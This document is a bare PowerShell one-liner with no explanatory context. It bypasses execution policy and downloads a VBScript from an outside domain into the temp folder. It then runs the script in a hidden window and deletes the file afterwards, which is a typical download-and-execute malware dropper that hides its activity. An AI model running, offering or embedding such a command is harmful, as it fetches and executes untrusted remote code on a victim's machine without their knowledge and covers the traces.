powershell -NoProfile -ExecutionPolicy Bypass -Command "$vbsUrl = 'https://spizza.cc/brainrot.vbs'; $vbsContent = (Invoke-WebRequest -Uri $vbsUrl -UseBasicParsing).Content; $vbsContent | Out-File `"$env:TEMP\script.vbs`"; Start-Process `"wscript.exe`" -ArgumentList `"`"`"$env:TEMP\script.vbs`"`"`" -WindowStyle Hidden -Wait; Remove-Item `"$env:TEMP\script.vbs`""
